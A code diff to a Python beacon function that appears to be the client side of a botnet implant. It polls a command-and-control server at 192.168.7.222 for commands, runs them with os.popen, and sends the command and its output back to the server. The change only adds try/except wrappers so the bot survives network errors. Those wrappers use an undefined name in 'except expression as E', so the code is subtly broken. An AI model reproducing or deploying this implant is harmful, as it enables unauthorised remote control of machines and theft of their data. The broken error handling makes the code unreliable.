@@ -37,8 +37,10 @@ def beacon():
 		offset = random.randrange(-7,7)
 
 		#commands from server to run
-		commands = requests.get('http://192.168.7.222/beacon?ip={}'.format(ip))
-
+		try:
+			commands = requests.get('http://192.168.7.222/beacon?ip={}'.format(ip))
+		except expression as E:
+			pass
 		#catch error for bot not being in botlist on server
 		if commands.status_code == 500:
 			continue
@@ -49,7 +51,10 @@ def beacon():
 				#executes comand
 				cmds[cmd] = os.popen(cmd).read()
 				#send confirmation of command being run
-				requests.get('http://192.168.7.222/confirm?ip={}&cmd={}&output={}'.format(ip, cmd, cmds[cmd])) 
+				try:
+					requests.get('http://192.168.7.222/confirm?ip={}&cmd={}&output={}'.format(ip, cmd, cmds[cmd])) 
+				except expression as E:
+					pass
 			#print commands
 			#print(cmds)
 			#TODO send command respone to server
